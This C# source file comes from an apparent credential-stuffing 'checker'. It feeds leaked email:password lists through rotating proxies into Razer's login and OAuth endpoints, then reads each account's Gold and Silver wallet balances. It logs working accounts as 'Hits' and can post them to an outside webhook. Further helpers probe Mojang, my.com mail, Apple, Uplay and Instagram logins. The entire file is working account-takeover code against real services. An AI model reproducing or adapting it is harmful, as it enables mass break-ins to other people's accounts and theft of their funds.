﻿using System; using Galaxy.Mainm;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using AuthGG;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	internal class razer1kek
	{
		public static string Path1;
		public static string Path;
		public static string Path2;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();
		public static void startchecker1()
		{
			for (; ; )
			{
				while (!razer1check.Combo.IsEmpty)
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (razer1check.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = razer1check.RandomProxies();
								httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0";
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.KeepAliveTimeout = Program.config.timeout;
								httpRequest.AllowAutoRedirect = false;
								httpRequest.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
								string data = "{\"data\":\"<COP><User><password>" + password + "</password><email>" + email + "</email></User><ServiceCode>0060</ServiceCode></COP>\"}";
								string login = httpRequest.Post("https://razerid.razer.com/api/emily/7/login/get", data, "application/json").ToString();
								if (login.Contains("Invalid Login, please check login ID and password"))
								{
									lock (Program.WriteLock)
									{
										Interlocked.Increment(ref razer1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
										Interlocked.Increment(ref razer1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
										Interlocked.Increment(ref razer1check.Bad); Interlocked.Increment(ref stats.bad);
										if (Program.config.showbad == "True" && Program.config.ui == 2)
										{
											Console.WriteLine("[»] Invalid - " + account, Color.Red);
										}
										Save(Path + "\\Invalid.txt", account);
									}
									break;
								}
								else if (login.Contains("valid username and password"))
								{
									string UID = Parse(login, "><User><ID>", "</ID><Token");
									string token = Parse(login, "ID><Token>", "</Token>");
									string tok = HttpUtility.UrlEncode(token);
									string post = httpRequest.Post("https://oauth2.razer.com/services/login_sso", $"grant_type=password&client_id=63c74d17e027dc11f642146bfeeaee09c3ce23d8&scope=sso%20cop&uuid={UID}&token={tok}", "application/x-www-form-urlencoded").ToString();
									httpRequest.ClearAllHeaders();
									httpRequest.AddHeader("Host", "oauth2.razer.com");
									httpRequest.AddHeader("Connection", "keep-alive");
									httpRequest.AddHeader("Accept", "application/json, text/plain, */*");
									httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
									httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36");
									httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
									httpRequest.AddHeader("Origin", "https://razerid.razer.com");
									httpRequest.AddHeader("Sec-Fetch-Site", "same-site");
									httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
									httpRequest.AddHeader("Referer", "https://razerid.razer.com/?client_id=63c74d17e027dc11f642146bfeeaee09c3ce23d8&redirect=https%3A%2F%2Fgold.razer.com%2F");
									httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
									string post2 = httpRequest.Post("https://oauth2.razer.com/services/sso", $"client_id=63c74d17e027dc11f642146bfeeaee09c3ce23d8&scope=sso%20cop", "application/x-www-form-urlencoded").ToString();
									string tokkken = Parse(post2, "access_token\":\"", "\",");
									httpRequest.ClearAllHeaders();
									httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
									httpRequest.AddHeader("Pragma", "no-cache");
									httpRequest.AddHeader("Accept", "application/json, text/plain, */*");
									httpRequest.AddHeader("Host", "gold.razer.com");
									httpRequest.AddHeader("Connection", "keep-alive");
									httpRequest.AddHeader("x-razer-razerid", UID);
									httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
									httpRequest.AddHeader("x-razer-accesstoken", tokkken);
									string capture = httpRequest.Get("https://gold.razer.com/api/silver/wallet").ToString();
									string capture1 = httpRequest.Get("https://gold.razer.com/api/gold/balance").ToString();
									string silver = "";
									string gold = "";
									try
									{
										 silver = Parse(capture, "BonusSilver\":", ",");
									}
									catch
                                    {
										 silver = "0";
                                    }
									try
									{
										 gold = Parse(capture1, "totalGold\":", ",");
									}
									catch
									{
										 gold = "0";
									}
									string boi = $"{acc} - Silver: {silver} - Gold: {gold}";

									if (silver == "0" || gold == "0")
									{
										lock (Program.WriteLock)
										{
											Interlocked.Increment(ref razer1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
											Interlocked.Increment(ref razer1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
											Interlocked.Increment(ref razer1check.custom); Interlocked.Increment(ref stats.custom);
											if (Program.config.showlocked == "True" && Program.config.ui == 2)
											{
												Console.WriteLine("[»] Free - " + boi, Color.HotPink);
											}
											Save(Path + "\\Free.txt", boi);
										}
										break;
									}
									else
                                    {
										lock (Program.WriteLock)
										{
											Interlocked.Increment(ref razer1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
											Interlocked.Increment(ref razer1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
											Interlocked.Increment(ref razer1check.Hits); Interlocked.Increment(ref stats.hits);
											if (Program.config.showgood == "True" && Program.config.ui == 2)
											{
												Console.WriteLine("[»] Hits - " + boi, Color.LimeGreen);
											}
											if (Program.config.hitstowebhook == "True") { string data1 = "{\"username\": \"Hit Sender\",\"embeds\":[    {\"description\":\"[+] Hit: " + boi + "\", \"title\":\"" + Checking.currentrun + "\", \"color\":1018364}]  }"; string hitsend = httpRequest.Post(Program.config.webhook, data1, "application/json").ToString(); }
											Save(Path + "\\Hits.txt", boi);
										}
										break;
									}
									
								}
								else
								{

									string acc1 = email + ":" + password;
									razer1check.Combo.Enqueue(acc1);
									Interlocked.Increment(ref razer1check.retry);
									break;
								}
							}
							catch (Exception)
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								razer1check.Combo.Enqueue(acc1);
								Interlocked.Increment(ref razer1check.retry);
								break;
							}
						}
					}
				}
			}
		}
		public static string Parse(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
 
		private static Uri SFACheckUri = new Uri("https://api.mojang.com/user/security/challenges");
		public static bool SFACheck(string token)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = razer1check.RandomProxies();
						httpRequest.AddHeader("Authorization", "Bearer " + token);
						if (httpRequest.Get(razer1kek.SFACheckUri).ToString() == "[]")
							return true;
						break;
					}
				}
				catch
				{
					Interlocked.Increment(ref razer1check.Errors);
				}
			}
			return false;
		}
		public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));


		private static string MailAccessCheck(string email, string password)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = razer1check.RandomProxies();
						httpRequest.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";
						if (httpRequest.Get(new Uri("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=" + email + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password=" + password + "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&")).ToString().Contains("Ok=1"))
							return "Working";
						break;
					}
				}
				catch
				{
					Interlocked.Increment(ref razer1check.Errors);
				}
			}
			return "";
		}
		private readonly Random _random = new Random();
		private static string RandomString(int length)
		{
			const string pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			var builder = new StringBuilder();

			for (var i = 0; i < length; i++)
			{
				var c = pool[random.Next(0, pool.Length)];
				builder.Append(c);
			}

			return builder.ToString();
		}
		static string AppleGetToken(ref CookieStorage cookies)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = razer1check.RandomProxies();
						cookies = new CookieStorage();
						httpRequest.Cookies = cookies;
						httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36";
						httpRequest.AddHeader("Accept", "*/*");

						string strResponse = httpRequest.Get(new Uri("https://secure4.store.apple.com/shop/sign_in?c=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ&r=SCDHYHP7CY4H9XK2H&s=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ")).ToString();

						if (strResponse.Contains("stk\":\""))
						{
							return Regex.Match(strResponse, "stk\":\"(.*?)\"}").Groups[1].Value;
						}
					}
				}
				catch
				{
					Interlocked.Increment(ref razer1check.retry);
				}
			}
		}

		public int RandomNumber(int min, int max)
		{
			return _random.Next(min, max);
		}

		static Random random = new Random();
		public string RandomString(int size, bool lowerCase = false)
		{
			var builder = new StringBuilder(size);

			// char is a single Unicode character  
			char offset = lowerCase ? 'a' : 'A';
			const int lettersOffset = 26; // A...Z or a..z: length = 26  

			for (var i = 0; i < size; i++)
			{
				var @char = (char)_random.Next(offset, offset + lettersOffset);
				builder.Append(@char);
			}

			return lowerCase ? builder.ToString().ToLower() : builder.ToString();
		}
		public string RandomPassword()
		{
			var passwordBuilder = new StringBuilder();

			// 4-Digits between 1000 and 9999  
			passwordBuilder.Append(RandomNumber(1000, 9999));

			// 2-Letters upper case  
			passwordBuilder.Append(RandomString(2));
			return passwordBuilder.ToString();
		}
		public static string GetRandomHexNumber(int digits)
		{
			byte[] buffer = new byte[digits / 2];
			random.NextBytes(buffer);
			string result = String.Concat(buffer.Select(x => x.ToString("X2")).ToArray());
			if (digits % 2 == 0)
				return result;
			return result + random.Next(16).ToString("X");
		}


		private static string UPlayHas2FA(string ticket, string sessionId)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
					{
						req.Proxy = razer1check.RandomProxies();
						req.AddHeader("Ubi-SessionId", sessionId);
						req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
						req.Authorization = "Ubi_v1 t=" + ticket;
						string str = req.Get(new Uri("https://public-ubiservices.ubi.com/v3/profiles/me/2fa")).ToString();
						if (str.Contains("active"))
						{
							if (str.Contains("true"))
								return "true";
							if (str.Contains("false"))
								return "false";
						}
					}
				}
				catch
				{
					Interlocked.Increment(ref razer1check.retry);
				}
			}
		}

		private static string UPlayGetGames(string ticket)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
					{
						req.Proxy = razer1check.RandomProxies();
						req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
						req.Authorization = "Ubi_v1 t=" + ticket;
						string input = req.Get(new Uri("https://public-ubiservices.ubi.com/v1/profiles/me/club/aggregation/website/games/owned")).ToString();
						if (input.Contains("[") && input != "[]")
						{
							Match match1 = Regex.Match(input, "\"slug\":\"(.*?)\"");
							Match match2 = Regex.Match(input, "\"platform\":\"(.*?)\"");
							string str1 = "";
							string str2;
							while (true)
							{
								str2 = str1 + "[" + match1.Groups[1].Value + " - " + match2.Groups[1].Value + "]";
								match1 = match1.NextMatch();
								match2 = match2.NextMatch();
								if (!(match1.Groups[1].Value == ""))
									str1 = str2 + ", ";
								else
									break;
							}
							return str2;
						}
					}
				}
				catch
				{
				}
			}
		}

		private static string InstagramGetCSRF(ref CookieStorage cookies)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = razer1check.RandomProxies();
						httpRequest.IgnoreProtocolErrors = true;
						httpRequest.AllowAutoRedirect = false;
						cookies = new CookieStorage();
						httpRequest.Cookies = cookies;
						httpRequest.UserAgent = "Instagram 25.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)";
						httpRequest.Get(new Uri("https://i.instagram.com/api/v1/accounts/login/")).ToString();
						return cookies.GetCookies("https://i.instagram.com")["csrftoken"].Value;
					}
				}
				catch
				{
					Interlocked.Increment(ref razer1check.retry);
				}
			}
		}

		public static string yey(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
		public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}
		public static string uri = "";

		public static string auther = "";

		public static string showbad = "";

		public static string showlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
